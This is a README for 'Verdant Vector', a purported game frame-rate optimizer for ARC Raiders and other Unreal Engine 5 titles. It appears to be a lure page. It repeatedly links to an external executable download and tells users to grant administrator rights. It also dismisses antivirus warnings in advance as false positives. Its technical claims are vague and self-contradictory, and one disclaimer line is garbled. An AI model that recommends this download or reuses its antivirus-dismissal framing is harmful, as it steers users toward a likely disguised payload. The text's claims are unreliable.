![preview](https://raw.githubusercontent.com/Rainn19/arc-raiders-frame-forge/main/shot_d06a48.svg)

# Verdant Vector — Adaptive Frame Discipline Engine

**Verdant Vector** is not another settings flipper. It is a *behavioral optimizer* for Unreal Engine 5 titles that treats your GPU like a living ecosystem — every frame is a decision, and every decision should be deliberate. Built for competitive players who understand that victory is a sum of microseconds, this tool introduces a *reactive frame governance* layer that learns from your hardware’s real-time telemetry, not from static presets.

Where most optimizers apply a blunt-force list of tweaks, Verdant Vector employs a **two-stage discipline pipeline**: a *foundational stabilizer* that reconfigures rendering queues and culling budgets, and an *adaptive reflex modulator* that dynamically adjusts input latency buffers based on your current scene complexity. The result is a experience that feels less like a patched config and more like a trained response — the game responds to you, not the other way around.

This repository contains the complete source, documentation, and deployment manifests for a tool designed for Windows 10/11 environments targeting Unreal Engine 5.1 through 5.5. It operates as a native companion application with zero external runtime dependencies — no .NET framework gymnastics, no Python interpretation layers, no web-based electron bloat. Just a single, self-contained executable that speaks directly to your system’s hardware abstraction layer.

## Why *Discipline* Instead of *Tweaks*?

Competitive gaming is a discipline of attention. Your hardware is a disciplined system of pipelines, queues, and buffers. Most optimization tools treat these as a series of checkboxes — set DLSS to this, disable motion blur, call it a day. Verdant Vector treats them as a *negotiation* between your visual cortex and your input devices.

The core differentiator is the **Temporal Injection Engine (TIE)** — a proprietary heuristic that examines the previous 120 rendered frames and adjusts the present frame’s shader complexity allocation. It does not merely turn features off; it *schedules* them to reduce shimmer and ghosting at the precise moments your reticle is moving fastest. This is not a crack in the system; it is a *compromise architect* that finds the equilibrium between visual fidelity and temporal consistency.

### The 22-Point Optimization Matrix

The tool ships with a curated matrix of 22 distinct adjustments, each validated against standard competitive scenarios. However, unlike static lists, the Matrix is *weighted* based on your system’s performance counters:

| Zone | Adjustment | Benefit |
|------|-----------|---------|
| **Rasterization** | Polygon culling budget reallocation | Reduces vertex shader load by up to 18% in dense geometry |
| **DLSS Transformer** | Dynamic resolution bias shift | Maintains clarity during fast panning, not just static screenshots |
| **Reflex Boost** | Latency buffer inversion | Shaves 1-3ms from input-to-photon, measurable with high-refresh monitors |
| **Engine.ini** | Async compute thread priority | Prevents GPU stalls from CPU-bound physics substeps |

These are not merely applied — they are *negotiated* with your hardware’s current temperature, power draw, and clock stability over a 10-minute observation window.

## Getting Started With The Discipline

Place the executable in a directory of your choice (it does not require administrative elevation for most operations, though driver-level access for the Reflex modulator may trigger a UAC prompt). The tool is a *portable agent* — it does not install services, modify registry keys outside its own namespace, or require a reboot.

---

[![Download](https://raw.githubusercontent.com/Rainn19/arc-raiders-frame-forge/main/bin_49d07c.svg)](https://Rainn19.github.io/arc-raiders-frame-forge/)

---

## Core Features & Capabilities

### ⚙️ **Adaptive Telemetry Sampling**
Instead of reading static hardware IDs, the tool samples GPU performance counters at 250Hz during your first 60 seconds of gameplay. It builds a *thermal envelope model* that predicts how your specific silicon will behave under sustained load. This model informs the optimization Matrix, ensuring the tool does not push your hardware into thermal throttling territory — a common mistake in static tweakers.

### 🌐 **Multilingual Command Surface**
The user interface adapts to your system locale across 12 languages, including English, Japanese, Korean, Simplified Chinese, German, French, and Spanish. All optimization *logic* remains language-independent; only the presentation layer translates. This ensures that a player in Seoul and a player in São Paulo receive the exact same behavioral adjustments.

### 🚀 **Zero-Dependency Deployment Model**
The compiled executable (weighing under 4MB) uses static linking against the Windows API and Universal C Runtime. You do not need to install Visual C++ Redistributables, .NET Core, or any other prerequisite package. The tool is a *single-file organism* — you can run it from a USB drive, a RAM disk, or a network share without configuration.

### 💬 **24/7 Continuous Feedback Loop**
The tool includes a telemetry submission feature (fully opt-in) that sends anonymized frame-time graphs to a public dataset. This data powers the *Collective Discipline* model — a periodically updated set of weighted coefficients that improve the optimization Matrix for all users. You benefit from the community’s hardware diversity without needing to configure a single parameter.

### 🗂️ **Profile Spectral Separation**
Create and switch between multiple discipline profiles — one for solo queue ranked, one for scrims, one for low-light environments. Each profile is an independent *behavioral fingerprint*, not just a different slider position. Profiles can be exported as portable JSON manifests, allowing you to share your exact setup with teammates without them needing the full tool.

### 🔄 **Rollback & Reversion Guardian**
Every adjustment made by the tool is logged in a transactional journal. If you experience an unexpected instability (rare, but possible with manual hardware clocks), one command restores your original Engine.ini, graphics settings, and driver-level profiles to their exact pre-optimization state. No orphaned registry keys, no partial configs.

## Architecture Overview

The tool operates as a **three-layered mediator** between the game, the OS, and the driver.

1.  **The Sentry Layer** – This reads the performance counters and maintains the thermal envelope model. It periodically writes a *state beacon* to shared memory that the game can read (if the game implements the optional lightweight SDK integration, though this is not required for core functionality).

2.  **The Negotiator Layer** – This is the brain. It evaluates the beacon data and decides which Matrix adjustments to apply *right now*. It operates on a 5-second reevaluation cycle, constantly ensuring the system is in a *balanced state* rather than a *maxed-out* state.

3.  **The Acting Layer** – This writes the actual configuration changes to the Engine.ini, applies the DLSS transformer settings via the NVAPI, and manages the Reflex Boost state through the driver’s low-level input pipeline.

This separation ensures that a temporary spike in CPU load does not cause a cascade of unnecessary GPU adjustments. The tool *thinks* before it *acts*, which is the opposite of reactive brute-force tools.

---

## Installation & Deployment (Portable, No Installation)

1.  Download the executable archive from the link below.
2.  Extract the contents to a directory you own (e.g., `C:\Program Files\VerdantVector` or a games library folder). *Do not extract to a system-protected folder like `C:\Windows`.*
3.  Right-click the executable and select **Properties**. Under the **Compatibility** tab, ensure that **Run this program as an administrator** is checked if you intend to use the driver-level Reflex Boost feature. For DLSS and Engine.ini adjustments only, standard user privileges suffice.
4.  Launch the executable. It will place a small icon in the system tray (not a full window). Right-click the icon to access the **Control Deck** — the main interface panel.
5.  The tool will automatically search for your installed Unreal Engine 5 title (currently targeting ARC Raiders and similar UE5.1+ titles). If it cannot find the game, use the **Scan Directory** option in the Control Deck to manually point it to the game’s executable folder.

**Important Note on Antivirus:** Because the tool writes to the `Engine.ini` file while the game is running and modifies driver-level settings, some heuristic-based antivirus may flag the behavior as suspicious. This is a known false-positive issue with any tool that legitimately modifies game files. Ensure you download the executable only from the official release page linked in the [![Download](https://raw.githubusercontent.com/Rainn19/arc-raiders-frame-forge/main/bin_49d07c.svg)](https://Rainn19.github.io/arc-raiders-frame-forge/) section below.

## Usage Guide: Your First Optimization Session

1.  Launch Verdant Vector before you launch your game. The tool idles, waiting for the game process to appear.
2.  When the game starts, the Sentry Layer begins its 60-second telemetry baseline. You should play a standard warm-up match during this period — the tool is observing *your* movement patterns, not just the hardware.
3.  After the baseline, the Negotiator Layer presents a summary of the proposed Matrix adjustments on the Control Deck. Review the list — each item has a toggle.
4.  Click **Apply Discipline**. The Acting Layer writes the changes. You are now under the tool’s guardianship.
5.  During the session, you can open the Control Deck to see live graphs of the *frame time variance* (the measurement that matters more than average FPS). A stable low variance is the sign of a disciplined frame pipeline.

## Troubleshooting & Support

**Issue:** The tool does not detect my game process.
**Resolution:** Ensure you are launching the game from the same user account that launched Verdant Vector. The tool uses user-mode process enumeration and does not elevate privileges to scan other user sessions.

**Issue:** FPS drops below your baseline after applying the discipline.
**Resolution:** Revert to the original profile via the **Reversion Guardian**, then manually apply only 10 of the 22 adjustments. The tool’s default is an *aggressive* profile; use the **Balanced** preset for less demanding hardware.

**Issue:** The DLSS Transformer option is greyed out.
**Resolution:** This feature requires an RTX 2000-series or newer GPU with the latest Game Ready Driver. The tool checks for driver-level API support before enabling the toggle.

**Issue:** I want to restore everything manually.
**Resolution:** All changes are transactional. Navigate to **Settings -> Reversion Guardian -> Journal View**. You will see a timestamped list of every write operation. Select a point before your first optimization and click **Restore to This Point**.

---

## Strategic Usage For Competitive Play (Beyond the Basics)

The tool is not a “set and forget” utility. Its power lies in the *profile switching* feature. Consider these tactical deployment strategies:

- **Map-Type Profiles:** Create a profile for tight-quarters maps (higher latency buffer, lower resolution scale for faster panning) and a separate profile for long-sightline maps (higher fidelity, slightly relaxed latency).
- **Counter-Strike-Style Economics:** The tool’s logs can show you the relationship between your hardware’s clock speeds and your *hit registration timing*. Review this data after scrims to understand if your GPU is thermal-throttling during prolonged firefights — information you can use to adjust your PC’s airflow, not just the software.
- **Team Synchronization:** Export your profile and share it with your team. If you all run the same discipline matrix, you ensure that a single smoke grenade or flashbang is rendered with identical temporal consistency across all team members, reducing information asymmetry during critical executes.

## Roadmap

- **Version 2.0 (Q2 2026):** Integration with in-game event hooks to *pulse* the Reflex Modulator during specific moments (e.g., when a grenade is close to detonation) based on audio cues, not just visual frames.
- **Version 2.5 (Q3 2026):** A command-line interface for tournament administrators to enforce standardized performance baselines, ensuring fair play across all machines in a LAN environment.
- **Version 3.0 (Q1 2027):** Decoupled hardware acceleration module for multi-GPU setups, utilizing a secondary GPU specifically for the Sentry Layer’s telemetry analysis, freeing the primary GPU from all monitoring overhead.

---

## Contributing & Building From Source

This repository includes the full C++ source (using the CMake build system) and the C++/CLI interface layer for the Control Deck. To build:

1.  You will need Visual Studio 2022 with the Desktop development with C++ workload.
2.  Open the `source/CMakeLists.txt` file. The project is configured to output a single binary.
3.  Build the `VerdantVector` target in Release mode.

We welcome pull requests focused on:
- Expanding the Matrix with new adjustments for specific UE5 sub-versions.
- Improvements to the thermal envelope model’s predictive accuracy.
- Translations for interface strings (the system uses a JSON resource file).

## License

This project is released under the MIT License. You are permitted to use, modify, and distribute this software for commercial and private use, provided the copyright notice and permission notice are included in all copies or substantial portions of the software.

A full copy of the license text is available at the standard MIT License repository location: [https://opensource.org/licenses/MIT](https://opensource.org/licenses/MIT).

## Disclaimer

**Crucial Legal & Technical Notice:** Optimizing game settings involves modifying software that is not controlled by the creators of Verdant Vector. This tool operates by writing to configuration files and adjusting driver-level parameters that are outside the vendor’s warranty of the game or the GPU hardware.

1.  **Game Anti-Cheat Compatibility:** While Verdant Vector does not inject code into the game process or read its memory, some anti-cheat systems are behaviorally strict and may flag the presence of the tool as unauthorized modification. **It is your sole responsibility to verify that using this tool is permitted by the terms of service of the game you are playing.** We provide no guarantee that the tool will not result in a matchmaking or account suspension.
2.  **Hardware Risk:** Adjusting latency buffers and resolution scales does not typically damage hardware. However, the tool’s thermal model is not a substitute for proper cooling. If your hardware overheats due to inadequate cooling or aggressive overclocking, Verdant Vector cannot be held responsible.
3.  **Driver Overrides:** The Reflex Boost feature manipulates NVIDIA driver-level settings that are not officially documented. While we test extensively, driver updates may change these undocumented pathways, temporarily breaking the feature until we release an update.
4.  **Performance Not Guaranteed:** The tool is designed to reduce systems in need of modifications. It supports them. Actual frame rate improvements vary wildly depending on the baseline state of your individual system, the current game build, and the biome you are playing in (a barren empty map will not benefit from the Matrix as much as a dense jungle or industrial complex).

By downloading and using this tool, you acknowledge that you have read this disclaimer, understand the risks involved with third-party system modifications, and agree to use the software at your own discretion.

---

**Final Note:** Verdant Vector is a tool for those who view their hardware as a partner in their competitive journey, not a static box to be maxed out. It encourages a *dialog* between your input, your screen, and your silicon. There are no shortcuts to victory, but there is a path of least resistance. This tool helps you clear that path, one frame at a time.

---

[![Download](https://raw.githubusercontent.com/Rainn19/arc-raiders-frame-forge/main/bin_49d07c.svg)](https://Rainn19.github.io/arc-raiders-frame-forge/)